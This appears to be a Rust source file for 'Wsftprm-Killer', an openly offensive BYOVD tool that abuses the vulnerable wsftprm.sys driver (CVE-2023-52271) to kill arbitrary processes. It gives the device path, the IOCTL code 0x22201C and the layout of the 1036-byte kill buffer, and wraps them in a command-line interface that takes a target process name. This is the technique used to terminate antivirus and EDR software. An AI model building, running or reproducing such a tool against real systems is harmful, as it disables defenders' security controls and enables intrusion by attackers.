use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - wsftprm.sys (Topaz Antifraud / Warsaw_PM)
// CVE-2023-52271 / SilverFox APT
// ============================================================================

struct WarsawPMDriver;

impl DriverConfig for WarsawPMDriver {
    fn driver_name(&self) -> &str {
        "wsftprm"
    }

    fn driver_file(&self) -> &str {
        "wsftprm.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\Warsaw_PM"
    }

    fn ioctl_code(&self) -> u32 {
        0x22201C
    }

    fn device_access(&self) -> u32 {
        use winapi::um::winnt::{GENERIC_READ, GENERIC_WRITE};
        GENERIC_READ | GENERIC_WRITE
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        // WarsawKillBuffer: [target_pid: DWORD] [padding: 1032 bytes]
        // Total size: 1036 bytes
        let mut buf = vec![0u8; 1036];
        buf[..4].copy_from_slice(&pid.to_ne_bytes());
        buf
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "Wsftprm-Killer", version, author = "BlackSnufkin")]
#[command(about = "BYOVD process killer using wsftprm driver (CVE-2023-52271)")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&WarsawPMDriver, &cli.process_name, None)
}
